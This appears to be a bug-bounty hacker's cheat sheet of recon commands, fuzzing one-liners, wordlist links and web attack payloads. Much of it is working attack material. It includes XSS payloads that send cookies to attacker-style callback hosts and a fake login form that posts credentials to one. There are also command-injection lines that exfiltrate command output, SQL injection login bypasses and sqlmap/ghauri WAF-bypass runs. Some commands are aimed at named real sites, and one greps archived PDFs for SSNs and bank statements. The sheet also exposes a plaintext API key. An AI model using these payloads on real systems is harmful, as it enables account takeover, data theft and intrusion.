========================================================================================================================================
>> https://swisskyrepo.github.io/PayloadsAllTheThings/
>> https://lostsec.xyz/
>> https://github.com/0xlipon/payloads
>> https://github.com/h6nt3r/tools.git
>> https://raw.githubusercontent.com/coffinxp/lostfuzzer/refs/heads/main/lostfuzzer.sh
>> https://raw.githubusercontent.com/Dheerajmadhukar/back-me-up/refs/heads/main/backmeup.sh


>> https://github.com/Bo0oM/fuzz.txt/blob/master/fuzz.txt


CanaryTokens: https://canarytokens.org/nest/
Blind XSS: https://xss0r.com/dashboard#payloads
DNS: https://app.interactsh.com/#/
Hook: https://webhook.site/

https://github.com/dirtycoder0124/form_finder/tree/main
https://github.com/yogsec/endpoints-extractor/tree/main

Use Everywhere: '"><svg/onload=prompt(7);>{{7*7}}

Inject Payload:
---------------
exiftool -Title="'\"><script src=https://xss0r.com/c/lostsec></script>" lostsec.jpg

$ nuclei -auth
https://github.com/reewardius/Nuclei-AI-Prompts
https://nucleiprompts.com/prompt.php?vuln_id=1

nuclei -target https://xxxxx.com -ai "Find common XSS patterns in response bodies."
nuclei -list unique-urls.txt -ai "Find admin login endpoints"

--------------------------------------------------------------------------------------------------------------------------------------
https://web.archive.org/cdx/search/cdx?url=*.example.com/*&collapse=urlkey&output=text&fl=original

https://www.virustotal.com/vtapi/v2/domain/report?apikey=982680b1787fa59701919aa22515a025e00df1e3bb2bc4f186b8e919558d576c&domain=example.com

https://otx.alienvault.com/api/v1/indicators/hostname/domain.com/url_list?limit=500&page=1

curl -G "https://web.archive.org/cdx/search/cdx" --data-urlencode "url=*.example.com/*" --data-urlencode "collapse=urlkey" --data-urlencode "output=text" --data-urlencode "fl=original" > out.txt

cat out.txt | uro |  grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5|\.exe|\.dll|\.bin|\.ini|\.bat|\.sh|\.tar|\.deb|\.rpm|\.iso|\.img|\.apk|\.msi|\.dmg|\.tmp|\.crt|\.pem|\.key|\.pub|\.asc'

https://web.archive.org/web/*/paypal.com*  -> @gmail. @hotmail, %40, pdf...

curl "https://web.archive.org/cdx/search/cdx?url=*.teamviewer.com/*&collapse=urlkey&output=text&fl=original&filter=original:.*\.(xls|xml|xlsx|json|pdf|q1|doc|docx|pptx|txt|git|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yl|gz|config|csv|yaml|md|md5|exe|dll|bin|ini|bat|sh|tar|deb|rpm|iso|img|env|apk|mi|ng|tm|ct|pe|key|pub|asc)$" | tee secrets.txt

cat output.txt | grep -Ea '\.pdf' | while read -r url; do curl -s "$url" | pdftotext - - | grep -Eaiq '(internal use only confidential strictly private personal & confidential private restricted internal not for distribution do not share proprietary trade secret classified sensitive bankstatement invoice salary contract|| agreement | non disclosure passport social security ssn date of birth credit card identity id number company confidential staff only management only internal only)' && echo "$url"; done

cat urls.txt | grep -E "\.txt/\.log/\.cache/\.secret|\.db/\.backup/\.yml/\.json/\.gz|\.rar|\.zip/|\.tar/\.sql/\.env/\.config/\.conf/\.ini/\.htaccess/\.htpasswd/\.pem/\.key/\.crt/\.cer/\.pfx/\.p12/\.swp/\.bak/\.old/\.tmp/\.temp/\.dump/\.passwd/\.shadow/\.git/\.svn/\.DS_Store/\.idea/\.vscode/\.bash_history/\.zsh_history"

cat 403_sub.txt | dirsearch --stdin --exclude-status=401,404,403,429,500,503 -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bkp,cache,cgi,conf,csv,html,unc,jar,js,json,jsp,jsp~,lock,log,rar,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js,.json --random-agent -f --threads 50 -t 10 --exclude-sizes 0B -o dir.txt

https://web.archive.org/cdx/search/cdx?url=bugbountyhunter.xyz/*&output=text&fl=original&collapse=urlkey
https://web.archive.org/cdx/search/cdx?url=*.bugbountyhunter.xyz/*&output=text&fl=original&collapse=urlkey&filter=statuscode:200
curl -L 'https://web.archive.org/cdx/search/cdx?url=redacted.redacted.redacted.com/xxx/x/*&output=text&fl=original&collapse=urlkey&filter=statuscode:200' > output.txt

$ git clone https://github.com/anmolksachan/WayBackupFinder.git
$ python3 wayBackupFinder.py

Fuzzing:
========

Subdomain Bruteforce:
ffuf -w subdomains-top1million-110000.txt -u https://FUZZ.example.com -H "Host: FUZZ.example.com" -o subdomains-bruteforce.txt

dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json  -u https://adminblog.abc.com/

dirsearch -u https://sub.domain.com -x 403,404,500,400,502,503,429 --random-agent
dirsearch -u https://sub.domain.com -e xml,json,sql,db,log,yml,yaml,bak,txt,tar.gz,zip -x 403,404,500,400,502,503,429 --random-agent

wfuzz -c -z file,wordlist -R 3 --sc 301,200 target/FUZZ

ffuf -w ~/wordlists/Bug-Bounty-Wordlists/all-files-leaked.txt -u https://something.edu.bdFUZZ
ffuf -w iis.txt -u https://40.78.107.245/FUZZ -recursion

GET:  gobuster dir -u https://example.com -w /path/to/wordlist.txt
POST: gobuster dir -u https://example.com/login -c ‘username=^USER^&password=^PASS^’ -t 50 -w /path/to/payload.txt

GET:  ffuf -u "https://example.com/search?q=FUZZ" -w /path/to/wordlist.txt
POST: ffuf -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=FUZZ" -w /path/to/payloads.txt -u https://example.com/login

GET:  wfuzz -c -z file,/path/to/payloads.txt https://example.com/search.php?search=FUZZ
POST: wfuzz -z file,/path/to/wordlist.txt -d "username=FUZZ&password=password123" https://example.com/login

404 Recon:
----------
ffuf -w wordlists.txt:WORD -w char.txt:CHAR -u http://httpbin.org/WORD/CHAR -mc 200

ffuf -w subdomains.txt:SUB -w payloads/senstivejs.txt:FILE -u https://SUB/FILE -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0" -fs 0 -c -mc 200 -fr false -rate 10 -t 10

for checking in burpsuite:
ffuf -w subdomains.txt:SUB -w payloads/senstivejs.txt:FILE -u https://SUB/FILE -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0" -fs 0 -c -mc 200 -fr false -rate 10 -t 10 -x http://localip:port
and check for response size and words if its big or something unique you can check it manually also make sure cut https:// http:// protocol before ffuf by using this command cat subdomains.txt | sed 's|https\?://||g' >finalsubs.txt
========================================================================================================================================

payload for testing HTML/XSS/IFRAME/ATO/PHISHING

HTMLi:
<font color="red">ERROR 1064 (42000): You have an error in your SQL syntax;

Redirect:
"/><img src="x"><a href="https://evil.com">login</a>
<h1><font Color=red>Visit  Our  New  WebSite </h1><h3><mark><a href="https://example.com">e x a m p l e . c o m </a></mark></h3>

RXSS:
<img src/onerror=prompt(document.cookie)>

IFrame:
"><iframe src="https://www.cia.gov/" style="border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width:100%; height:100%">

ATO:
<img src=x  onerror="document.location='http://o0p70yehe4avf6728g095671asgj49sy.oastify.com?c='+document.cookie;" />

PHISHING:
<h3>Please login to proceed</h3> <form action=http://zgj49ubrlvka5wgrek9bc0eryi49s0io7.oastify.com>
Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br>

Deface:
e%27"()%26%25<zzz>%27"><script%20src=https://jso-tools.z-x.my.id/raw/~/RD9CXXDM006AY></script>

Xss Alert:
e%27"()%26%25<zzz><ScRiPt%20>alert(9155)</ScRiPt>

PDF-prompt:
https://raw.githubusercontent.com/coffinxp/pdFExploits/refs/heads/main/cookieprompt.pdf

--------------------------------------------------------------------------------------------------------------------------
Email Address:
--------------
1' OR '1'='1' -- -@gmail.com
"1' OR '1'='1' -- -"@gmail.com

'"><svg/onload=alert(1);>'

RCE:  https://subdomain.domain.tld/emdpoint?param=value;curl https://leejddzqxtsqqoufangeztlfxozoqwtf2.oast.fun -X POST -d `id`
RCE:  https://subdomain.domain.tld/emdpoint?param=value;nslookup `whoami`.leejddzqxtsqqoufangeztlfxozoqwtf2.oast.fun

FUZZ:   ffuf -w ~/wordlists/Bug-Bounty-Wordlists/all-files-leaked.txt -u https://nxdev.bbbbbbbt.edu.bdFUZZ

Dirsearch:  dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json  -u https://adminblog.abc.com/

gospider -S hosts -a -w --sitemap -r -c 20 -d 8 -H "User-Agentt: blindxss" -H "X-Forward-For: '">{{7*7}}${2*2}" -H  "Accept: ../../../../../../../../../../etc/passwd{{" -p http://127.0.0.1:8080

Stored XSS in Email Fields:
--------------------------
validemail+test<h1/onmouseover​=alert(origin)>test@gmail.com
lipsec+<h1/onmouseover​=alert(origin)>lipseclimited@gmail.com

XSS in Email Login Fields:
--------------------------
Validator: https://www.randomstuff.org.uk/emailvalidator.shtml
test+(<script>alert(document.domain)</script>)@gmail.com
"><svg/onload=confirm('XSS')>"@x.y
"><img src=x onerror=alert(document.cookie);>
“><svg/onload=confirm(1)>”@gmail.com

Persistent XSS in the Signup Process:
-------------------------------------
<img src=x onerror​=alert(origin)>

Awesome XSS:
------------
<iframe/onload=alert(document.domain)>

SQLi Blind Time Base:
---------------------
xss' AND (SELECT 8091 FROM (SELECT(SLEEP(5)))sRDf) AND 'wRgw'='wRgw
XOR(if(now()=sysdate(),sleep(5),0))XOR

Top 10 XSS Payloads:
--------------------
<Img Src=//X55.is OnLoad=import(src)>
<Svg OnLoad=alert(1)>
“AutoFocus OnFocus=alert(1)//
<K ContentEditable AutoFocus OnFocus=alert(1)>
<Script>alert(1)</Script>
‘-alert(1)-’
JavaScript:alert(1)
\’/alert(1)//
<K OnPointerRawUpdate=alert(1)>
<Base Href=//X55.is>

# LOGIN BYPASS LIST
--------------------
' or '1'='1
1 or
'or 1]%00
or /* or '
1
or "a" or
1
' or 1 or
or true() or
'or string-length(name(.))<10 or'
'or contains(name, 'adm') or'
'or contains(., 'adm') or'
'or position()=2 or '
admin' or '
admin' or '1'='2
*)(&
*)(|(&
pwd)
*)((*
*) )%00

Amazing method: idor+sql url path+post method+originIp sql bypass+git+env disclosure:
-------------------------------------------------------------------------------------
subfidner -d <REDACTED> -all -silent | httpx-toolkit -sc -td -title -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
echo https://payment.<REDACTED> | gau
ghauri -u 'https://payment.<REDACTED>/instantpay/payment/*' --dbs --batch --level 3 --confirm
dirsearch -u https://<REDACTED>/ -w payloads/all_attacks.txt -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sqlasp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip -i 200 --full-url
shodan search Ssl.cert.subject.CN:"<REDACTED>" 200 --fields ip_str | httpx-toolkit -sc -title -server -td
ghauri -r request.txt --dbs --batch --level 3 --tech=t 

waymore -i domain[.]com -mode U -oU waymore_urls.txt
cat waymore_urls.txt | grep "tld:" | grep -v ":80" | grep -v ":443" | sort -u | uro > juicy.txt

Fuzzing Mastery:
---------------
https://osintteam.blog/ffuf-mastery-the-ultimate-web-fuzzing-guide-f7755c396b92

Awesome Wordlists:
------------------
https://wordlists.assetnote.io/
https://github.com/Bo0oM/fuzz.txt
https://github.com/Karanxa/Bug-Bounty-Wordlists
https://github.com/fuzzdb-project/fuzzdb
https://github.com/orwagodfather/WordList
https://github.com/six2dez/OneListForAll/blob/main/onelistforallmicro.txt
https://github.com/0xspade/Combined-Wordlists
https://github.com/YaS5in3/Bug-Bounty-Wordlists
https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d
https://github.com/maurosoria/dirsearch/blob/master/db/dicc.txt
https://github.com/abdallaabdalrhman/Wordlist-for-Bug-Bounty
https://github.com/Net-hunter121/API-Wordlist
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-directories.txt
https://github.com/kaimi-io/web-fuzz-wordlists
https://github.com/chrislockard/api_wordlist
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/http-request-methods.txt
https://github.com/assetnote/wordlists/blob/master/data/automated.json
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common-api-endpoints-mazen160.txt
https://github.com/n0kovo/awesome-wordlists
https://github.com/0xPugazh/fuzz4bounty
https://github.com/gmelodie/awesome-wordlists
https://gist.github.com/nullenc0de/9cb36260207924f8e1787279a05eb773
https://gist.github.com/nullenc0de/96fb9e934fc16415fbda2f83f08b28e7#file-content_discovery_nullenc0de-txt
https://gist.github.com/jhaddix/f64c97d0863a78454e44c2f7119c2a6a

Custom Wordlist:
----------------
https://github.com/digininja/CeWL
$ cewl https://example.com/ --header "Cookie: PHPSESSID=2kkadakdajda931ada" -d 5 -m 4

Also Tomnomnom's Tok:
---------------------
https://github.com/tomnomnom/hacks/blob/master/tok/main.go
$ cat urls.txt | ./tok

intitle:"index of" site:*.yourtarget.com

Oneliner: https://github.com/0xPugazh/One-Liners

' or 1=1-- -@xss0r.com/c/lostsec
'/*!50000OR*/1=1--%20-
"><img src=x onerror=window.name='xss';fetch(`//xss0r.com/c/lostsec?d=${window.name}`)>
admin%00' OR 1=1-- -

For Subdomain Enumeration:
--------------------------

1-Subdomainer(contain sudfinder,amass whois mode,amass passive mode,crt/.sh,GitHub,gobuster,knockpy,)
2-chaos(Archived Data)
3-frogy(wayback,bbot,subfinder,findomain,http://crt.sh)
4-assetfinder (certspotter,hackertarget,threatcrowd,wayback ,bufferover,facebook)

Fuzzing:
--------
https://github.com/six2dez/OneListForAll/tree/main

2)Do second subdomain enum for result of first with api key
subfinder -dL sub |tee subs
subfinder -dL subs |tee subss

https://github.com/TheGetch/Burp-Suite-Pro-Scan-Profiles
https://github.com/yubsy/Wordpress-Exploits

echo http://speedway.net.au | gau | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep "="
sqlmap -u 'https://domain.com/blablabla.php?kID=1%27' -p parameter --dbs --delay=3

waybackurls --dates domain(.)com | grep '?id='
Payload : if(now()=sysdate(),SLEEP(8),0)
ghauri -u https://......?id=1 --dbs --hostname --current-db

curl -k -s --path-as-is -X GET https://domain.com/x/document.php

For Windows IIS Server: Must Try shortscan, CVE-2024-39677: NHibernate SQL Injection Vulnerability

----------------------------------------------------------------------------------------------------------------------

Coffin Bro:
===========
https://medium.com/meetcyber/my-private-nuclei-template-collection-for-easy-bounties-ba704073d065

Best oneliner for Finding mass xss vulnerability:
=================================================
echo https://www.oshi.pk/ | gau | gf xss | uro | Gxss | kxss | tee xssUnfiltered.txt

echo https://ravagedband.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | Gxss | kxss

Advance methodlogy for mass Hunting SQL Injection:
==================================================
for multiple subdomains:
subfinder -dL subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'

for single domain:
subfinder -d http://example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'

echo 'https://mylocal.life/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\*|\$[^\:]*):0:0:"

Header based injection:
-----------------------
X-Forwarded-Host: http://evil.com"><img src/onerror=prompt(document.cookie)>
X-Forwarded-Host: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
Referer: https://site.com/'+(select*from(select(sleep(10)))a)+'
Cookie: 'XOR(if(now()=sysdate(),sleep(10),0))XOR'
User-Agent: "XOR(if(now()=sysdate(),sleep(10),0))XOR"


Cool Nuclei Templates: 
=====================
https://github.com/schooldropout1337/nuclei-templates
https://github.com/coffinxp/nuclei-templates/tree/main

subfinder -d target -o target && nuclei -t wp-xyz-takeover[.]yaml -l target

Craizy Tools: https://github.com/blackhatethicalhacking

Mad wordlist: https://wordlists-cdn.assetnote.io/data/manual/

Gained a reverse shell through a PNG file using I-Espresso and Xploitra.
https://github.com/AnonKryptiQuz/Xploitra
https://github.com/AnonKryptiQuz/I-Espresso

For Sqli:
---------
echo http://speedway.net.au | gau | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep "="
echo http://speedway.net.au | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | tee output.txt

checking CORS use this simple curl command:
-------------------------------------------
curl -H "Origin: http://example.com" -I https://etarapartners.com/wp-json/ | grep -i -e "access-control-allow-origin" -e "access-control-allow-methods" -e "access-control-allow-credential"

SQLi Advanced Coffin Bro:
-------------------------
python3 loxs.py
curl -I 'fullurlwithsqlpayload'
ghauri -u 'urlendpoint' --dbs --batch --level 3 --dbms oracle --tech=T

403 WAF Bypass:
---------------
sqlmap --url https://example.com/endpoint.php?id=1 --dbs --random-agent --level 5 --tech=t --threads 5 --tamper=between,space2comment,randomcase --batch

Mass sqli automation:
subfinder -d http://example.com -all -silent | gau --threads 50 | uro |
gf sqli >sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm

echo example.com | gau --threads 50 | uro | gf sqli >sqli.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm

Best command for finding hidden param by Arjun tool:
----------------------------------------------------
arjun -u https://site.com/endpoint.php -oT arjun_out.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"
arjun -u https://site.com/endpoint.php -oT arjun_out.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parametrs-names.txt -t 10 --rate-limit 10 --passive --headers "User-Agent: Mozilla/5.0"

Easy WAFBypassed:
-----------------
sqlmap -u 'https://test.com/payu/skill/index.php?id=34' --batch --dbs --threads=5 --random-agent --risk=3 --level=5 --tamper=space2comment -v 3 --dbms  MySQL

amazing LFI oneliner:
---------------------
echo http://site.com | gau | urldedupe -qs | gf lfi |  sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | while read urls; do ffuf -u $urls -w payloads/lfi.txt -c -mr "root:"" -v; done

Subowner - A Simple python based tool to check for subdomain takeovers
https://github.com/ifconfig-me/subowner

Automation:
-----------
ghauri -m sqli --confirm --batch --level=3  -b
cat his | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|icon|pdf|svg|txt|js)" | uro | qsreplace 'XSS'| httpx | anew xss.txt
knoxnl -i xss -X BOTH 
python3 http://lfimap.py -F lfi --use-long -a --no-stop

Subversion metadata directory (.svn) , download the source code of the website and database credentials and wc.db
https://github.com/anantshri/svn-extractor
python3 svn_extractor.py --url


